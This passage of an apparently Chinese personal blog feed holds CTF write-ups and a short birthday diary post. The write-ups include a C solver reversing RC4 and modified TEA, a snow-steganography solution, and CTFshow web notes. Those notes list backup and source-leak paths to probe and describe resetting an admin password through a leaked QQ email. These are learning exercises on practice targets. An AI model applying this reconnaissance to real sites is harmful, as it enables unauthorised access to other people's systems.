[esp+4Ch] [ebp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+50h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+6Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+74h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+78h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v9 = a2 + <span class="number">116</span>;</span><br><span class="line">  v8 = a2 + <span class="number">116</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i += <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    v5 = *(_DWORD *)(v8 + <span class="number">4</span> * i);</span><br><span class="line">    v4 = *(_DWORD *)(v8 + <span class="number">4</span> * i + <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 -= <span class="number">559038737</span>;</span><br><span class="line">      v5 += (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">1</span>) + (v4 &gt;&gt; <span class="number">5</span>)) ^ (v6 + v4) ^ (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span>)</span><br><span class="line">                                                                                       + <span class="number">16</span> * v4);</span><br><span class="line">      v4 += (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">3</span>) + (v5 &gt;&gt; <span class="number">5</span>)) ^ (v6 + v5) ^ (*(<span class="type">unsigned</span> __int8 *)(v9 + (<span class="number">4</span> * i + <span class="number">8</span>) % <span class="number">32</span> + <span class="number">2</span>)</span><br><span class="line">                                                                                       + <span class="number">16</span> * v5);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span> * i) = v5;</span><br><span class="line">    *(_DWORD *)(v8 + <span class="number">4</span> * i + <span class="number">4</span>) = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个魔改的tea<br>所以程序对我们的输入进行了 RC4+xor+tea<br>最后的check<br>将32个字符再xor一个key数组后两两一组映射到一个二维数组上 并与已知(??????)的一个二维数组比较check<br>整个题还是很不错的 只是为什么我就是找不到”已知”的二维数组的值啊…<br>贴个官方exp(硬是不告诉我truemap是多少对吧😄):<br>这里exp写的挺好的 用C的 unsigned char 和 unsigned int 省去了数据类型转换的麻烦<br>还有就是一个小细节 : tea逆向的时候外层循环也要倒着循环</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;dataFlag.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Tea</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* str)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tea解密中\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* box = (<span class="type">unsigned</span> <span class="type">int</span>*) str;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">6</span>; i &gt;= <span class="number">0</span>; i = i - <span class="number">2</span>)&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> k0 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span>], k1 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">1</span>],</span><br><span class="line">k2 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">2</span>], k3 = str[(i + <span class="number">2</span>) * <span class="number">4</span> % <span class="number">32</span> + <span class="number">3</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> delta=<span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> l = box[i], r=box[i + <span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> ii = <span class="number">0</span>; ii &lt; <span class="number">32</span>; ii++)&#123;</span><br><span class="line">sum+=delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span>; j++)&#123;</span><br><span class="line">r-=((l&lt;&lt;<span class="number">4</span>)+k2)^(l+sum)^((l&gt;&gt;<span class="number">5</span>)+k3);</span><br><span class="line">l-=((r&lt;&lt;<span class="number">4</span>)+k0)^(r+sum)^((r&gt;&gt;<span class="number">5</span>)+k1);</span><br><span class="line">sum-=delta;</span><br><span class="line">&#125;</span><br><span class="line">box[i] = l;</span><br><span class="line">box[i + <span class="number">1</span>] = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tea解密完毕\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initST</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *T, <span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">S[i] = i;</span><br><span class="line">T[i] = K[i%len];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initS</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *T)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = (j + S[i] + T[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = S[j];</span><br><span class="line">S[j] = S[i];</span><br><span class="line">S[i] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">initK</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *S, <span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0x00</span>;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(r=<span class="number">0</span>; r&lt;len; r++)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = S[j];</span><br><span class="line">S[j] = S[i];</span><br><span class="line">S[i] = tmp;</span><br><span class="line">t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line">K[r] = S[t];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">RC4</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *K, <span class="type">unsigned</span> <span class="type">char</span> *M, <span class="type">unsigned</span> <span class="type">char</span> *E, <span class="type">int</span> len)</span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ans[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(ans, M,<span class="number">32</span>);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">0</span>)&#123;</span><br><span class="line">E[i] = (M[i] ^ K[i]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">E[i] = (M[i] ^ K[i] ^ ans[K[i] % i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_ENC</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* enc)</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RC4解密中\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> T[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> K[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> M[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* E = enc;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> C[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">memset</span>(S, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(S));</span><br><span class="line"><span class="built_in">memset</span>(T, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(T));</span><br><span class="line"><span class="built_in">memset</span>(K, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(K));</span><br><span class="line"><span class="built_in">memset</span>(C, <span class="number">0x00</span>, <span class="keyword">sizeof</span>(C));</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span>*)M, (<span class="type">char</span>*)E);</span><br><span class="line">itoa(<span class="number">20220222</span>, (<span class="type">char</span>*)K, <span class="number">8</span>);</span><br><span class="line">initST(S, T, K, <span class="built_in">strlen</span>((<span class="type">char</span>*)K));</span><br><span class="line">initS(S, T);</span><br><span class="line">initK(S, K, <span class="number">256</span>);</span><br><span class="line">RC4(K, M, E, <span class="number">32</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;RC4解密完毕\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> keyMap[] =</span><br><span class="line">&#123;<span class="number">241</span>,<span class="number">239</span>,<span class="number">97</span>,<span class="number">187</span>,<span class="number">201</span>,<span class="number">69</span>,<span class="number">87</span>,<span class="number">67</span>,<span class="number">54</span>,<span class="number">235</span>,<span class="number">195</span>,<span class="number">245</span>,<span class="number">97</span>,<span class="number">31</span>,<span class="number">224</span>,<span class="number">237</span>,<span class="number">95</span>,<span class="number">25</span>,<span class="number">195</span>,<span class="number">131</span>,<span class="number">11</span>,<span class="number">103</span>,<span class="number">9</span></span><br><span class="line"><span class="number">1</span>,<span class="number">68</span>,<span class="number">122</span>,<span class="number">157</span>,<span class="number">178</span>,<span class="number">126</span>,<span class="number">245</span>,<span class="number">181</span>,<span class="number">34</span>,<span class="number">101</span>&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> enc[<span class="number">33</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">300</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">300</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(TrueMap[i][j] == <span class="number">1</span>)&#123;</span><br><span class="line">enc[index++] = i;</span><br><span class="line">enc[index++] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">32</span>; i++)&#123;</span><br><span class="line">enc[i] ^= keyMap[i];</span><br><span class="line">&#125;</span><br><span class="line">Tea(enc);</span><br><span class="line">RC4_ENC(enc);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,enc);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后第二部分flag的值: b0fa99f5bbd8bcf85d029dfd3033de7f</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="xxx-下雪了"><a href="#xxx-下雪了" class="headerlink" title="xxx 下雪了"></a>xxx 下雪了</h2><p>对我来说挺新颖的<br>首先是一个压缩包密码爆破 题目给了字典 爆就完了<br>密码: blueSHARK666<br>然后在tip.txt找到很大一串base64 学到这是base64嵌套 一直解 解到最后一步得到:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>又学习到了这种用词频统计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = s <span class="comment">#文件打开处</span></span><br><span class="line"> </span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"> </span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到出现频率 : ISCTFZ023daGYXpJmbNxMcEjn5BeoOQy4D9q6PAfghiklrstuvwzHKLRUVW178!@#$%^&amp;*()_+- &#x3D;{}[]<br>有意义的为 ISCTFZ023 作为snow隐写的密码 最后得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./SNOW.EXE -C -p ISCTFZ023 flag.txt</span><br></pre></td></tr></table></figure><p>flag: ISCTF{34da-a87s-sk87-s384-3982-398233}</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1>]]></content>
      
      
      <categories>
          
          <category> CTF-WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.6 Birthday-For-Ulganoy</title>
      <link href="/12-6-Birthday-For-Ulganoy/"/>
      <url>/12-6-Birthday-For-Ulganoy/</url>
      
        <content type="html"><![CDATA[<p>20岁生日🎂</p><span id="more"></span><p>笑死 明天把概率统计学好就是最好的庆生(🤣)！</p><p>辗转许久 终于能一步步向自己的目标迈进了！<br>虽然学校的课很sb… 但可以自学好多好多有趣的内容！<br>CTF是以练促学的手段 趁现在还有精力的时候多学点<br>web pwn reverse crypto 都那么的有意思啊！<br>web&#x2F;pwn自不必说(HackerDesu<em>★,°</em>:.☆(￣▽￣)&#x2F;$:<em>.°★</em> 。)<br>reverse<del>毕竟我是要解包万华镜</del>也要学好<br>crypto可以很好的促进数学的学习和锻炼思维能力<br>努力自我提升吧！！！頑張る！</p><p>这一年还入坑了二次元… 二次元给我带来了好多好多美好的东西啊<br>从JoJo6开始到京吹 点兔 安岛… 太多美好回忆了~<br>在这里立个flag: 大三暑假(maybe)去日本好好逛逛 宇治市 大吉山 京阿尼 芳文社…<br>期待明年四月的京吹！</p><p>Kitauji Fightooooo!</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web-CTFshow</title>
      <link href="/web-CTFshow/"/>
      <url>/web-CTFshow/</url>
      
        <content type="html"><![CDATA[<p>记载CTFshow上的web题目(少数能复现 大多都只能看WP&#x2F;视频 来积累思路)</p><span id="more"></span><p><strong>感谢@L1Nk8ug师傅借我号 终于可以复现了~</strong><br><a href="https://l-i-n-g-c-e-n-g.github.io/" target="_blank">友链</a></p><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>VIP题目限免呐~</p><h2 id="web1-源码泄露"><a href="#web1-源码泄露" class="headerlink" title="web1 源码泄露"></a>web1 源码泄露</h2><p>bp抓包可以直接在response的源码看到flag</p><h2 id="web2-前台JS绕过"><a href="#web2-前台JS绕过" class="headerlink" title="web2 前台JS绕过"></a>web2 前台JS绕过</h2><p>az 直接ctrl+u就看到flag了<br>查看源码发现确实就是js前端作了全部return false的处理 但丝毫不影响 禁用js等操作都可以绕过</p><h2 id="web3-协议头信息泄露"><a href="#web3-协议头信息泄露" class="headerlink" title="web3 协议头信息泄露"></a>web3 协议头信息泄露</h2><p>bp抓包 然后在response看到Flag:一栏信息即为flag</p><h2 id="web4-robots后台泄露"><a href="#web4-robots后台泄露" class="headerlink" title="web4 robots后台泄露"></a>web4 robots后台泄露</h2><p>一些常见的备份文件(仅限于懒得用dirsearch…)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.index.php.swp</span><br><span class="line">index.php.swp</span><br><span class="line">index.php.bak</span><br><span class="line">.index.php~</span><br><span class="line">index.php.bak_Edietplus</span><br><span class="line">index.php.~</span><br><span class="line">index.php<span class="number">.1</span></span><br><span class="line">index.php</span><br><span class="line">index.php~</span><br><span class="line">index.php.rar</span><br><span class="line">index.php.zip</span><br><span class="line">index.php<span class="number">.7</span>z</span><br><span class="line">index.php.tar.gz</span><br><span class="line">www.zip</span><br><span class="line">www.rar</span><br><span class="line">www.zip</span><br><span class="line">www<span class="number">.7</span>z</span><br><span class="line">www.tar.gz</span><br><span class="line">www.tar</span><br><span class="line">web.zip</span><br><span class="line">web.rar</span><br><span class="line">web.zip</span><br><span class="line">web<span class="number">.7</span>z</span><br><span class="line">web.tar.gz</span><br><span class="line">web.tar</span><br><span class="line">wwwroot.rar</span><br><span class="line">web.rar</span><br><span class="line">robots.txt</span><br><span class="line">index.phps</span><br></pre></td></tr></table></figure><p>结合题目提示 访问 &#x2F;robots.txt 得到flag的路径&#x2F;flagishere.txt 访问即可</p><h2 id="web5-phps源码泄露"><a href="#web5-phps源码泄露" class="headerlink" title="web5 phps源码泄露"></a>web5 phps源码泄露</h2><p>phps源码 &#x2F;index.phps<br>平时一般猜&#x2F;index.php 这里告诉我们有新的一种.phps<br>访问下载文件 里面即有flag</p><h2 id="web6-源码压缩包泄露"><a href="#web6-源码压缩包泄露" class="headerlink" title="web6 源码压缩包泄露"></a>web6 源码压缩包泄露</h2><p>常见的 &#x2F;<a href="http://www.zip/">www.zip</a><br>下载后得到fl000g.txt<br>猜想这是flag路径 访问 &#x2F;fl000g.txt 得到flag</p><h2 id="web7-版本控制泄露源码"><a href="#web7-版本控制泄露源码" class="headerlink" title="web7 版本控制泄露源码"></a>web7 版本控制泄露源码</h2><p>.git泄露(所以平时用git要小心啊!!!)<br>访问 &#x2F;.git 得到flag</p><h2 id="web8-版本控制泄露源码2"><a href="#web8-版本控制泄露源码2" class="headerlink" title="web8 版本控制泄露源码2"></a>web8 版本控制泄露源码2</h2><p>又学习到了新姿势<br>.svn泄露<br>访问 &#x2F;.svn 得到flag<br>注: SVN是一个开放源代码的版本控制系统(可实现多人协同开发 &amp; …)</p><h2 id="web9-vim临时文件泄露"><a href="#web9-vim临时文件泄露" class="headerlink" title="web9 vim临时文件泄露"></a>web9 vim临时文件泄露</h2><p>index.php.swp 泄露<br>vim中的swp即swap 交换分区 在编辑vim时用来备份缓冲区内容</p><h2 id="web10-cookie泄露"><a href="#web10-cookie泄露" class="headerlink" title="web10 cookie泄露"></a>web10 cookie泄露</h2><p>bp抓包 在request中的cookie栏得到flag(只是 ‘{‘和’}’被url编码了)</p><h2 id="web11-域名txt记录泄露"><a href="#web11-域名txt记录泄露" class="headerlink" title="web11 域名txt记录泄露"></a>web11 域名txt记录泄露</h2><p>题目提示: 域名其实也可以隐藏信息，比如flag.ctfshow.com就隐藏了一条信息<br>这里学习到利用DNS查询<br><a href="http://www.jsons.cn/nslookup/" target="_blank">在线网站</a>查询即可得到flag</p><h2 id="web12-敏感信息公布"><a href="#web12-敏感信息公布" class="headerlink" title="web12 敏感信息公布"></a>web12 敏感信息公布</h2><p>哇 很有趣的题~<br>利用题目提示 在下面heapline找到 372619038 猜测这是密码<br>但是找了半天找不到哪里用得上<br>看提示 说返回 &#x2F;admin ! 学到了 然后以 admin 372619038 登录即可得到flag~</p><h2 id="web13-内部技术文档泄露"><a href="#web13-内部技术文档泄露" class="headerlink" title="web13 内部技术文档泄露"></a>web13 内部技术文档泄露</h2><p>这 属实想不到 orz<br>Home最下面会发现document可以点！ 然后就能下载得到pdf…<br>里面<del>贴心的</del>记录了登录路径&#x2F;用户名&#x2F;密码…<br>跟着访问即可得到flag</p><h2 id="web14-编辑器配置不当"><a href="#web14-编辑器配置不当" class="headerlink" title="web14 编辑器配置不当"></a>web14 编辑器配置不当</h2><p>az 访问 &#x2F;editor (…)<br>进入里面 找到图片上传 发现可以访问文件空间 能看到网站的所有信息<br>然后在 &#x2F;var&#x2F;www&#x2F;nothinghere下找到flag地址 访问&#x2F;nothinghere&#x2F;flag…txt即可<br>&#x2F;var&#x2F;www下放置的是站点配置 所以用后面地址才能访问</p><h2 id="web15-密码逻辑脆弱"><a href="#web15-密码逻辑脆弱" class="headerlink" title="web15 密码逻辑脆弱"></a>web15 密码逻辑脆弱</h2><p>网站最下面泄露邮箱咯 <a href="mailto:&#49;&#x31;&#x35;&#54;&#x36;&#x33;&#x31;&#57;&#54;&#x31;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#49;&#x31;&#x35;&#54;&#x36;&#x33;&#x31;&#57;&#54;&#x31;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a> (敲响警钟！ 自己网站也要注意！)<br>访问 &#x2F;admin 密码尝试 1156631961发现不对劲 怎么都登不进去<br>又学到骚操作了 忘记密码 密保是城市 那么利用QQ号搜索！！！<br>在西安 就行了 orz<br>密码被重置为 admin7789</p><h2 id="web16-探针泄露"><a href="#web16-探针泄露" class="headerlink" title="web16 探针泄露"></a>web16 探针泄露</h2><p>你别说这网站还挺炫的 orz<br>?? 什么是探针??? </p><p><a href="https://xz.aliyun.com/t/2222#:~:text=%E7%BD%91%E7%AB%99%E6%8E%A2%E9%92%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF,%E5%9C%A8%E5%90%84%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%8A%E3%80%82">https://xz.aliyun.com/t/2222#:~:text=%E7%BD%91%E7%AB%99%E6%8E%A2%E9%92%88%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF,%E5%9C%A8%E5%90%84%E6%96%B0%E5%BB%BA%E7%BD%91%E7%AB%99%E4%B8%8A%E3%80%82</a></p><p>但是这道题 访问 &#x2F;tz.php<br>发现phpinfo()可以点击查看(也符合上面链接的介绍)<br>搜索flag即得</p><h2 id="web17-CDN穿透"><a href="#web17-CDN穿透" class="headerlink" title="web17 CDN穿透"></a>web17 CDN穿透</h2><p>透过重重缓存，查找到ctfer.com的真实IP<br><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a><br>这里直接ping即可 (做题归做题 还是要多学点相关知识)<br>但是貌似现在的ip变了… 比如我Ping&#x2F;查询 都得到的是 124.222.110.176 …</p><h2 id="web18-js敏感信息泄露"><a href="#web18-js敏感信息泄露" class="headerlink" title="web18 js敏感信息泄露"></a>web18 js敏感信息泄露</h2><p>一个小游戏界面 查看源码 发现score&gt;101会弹出 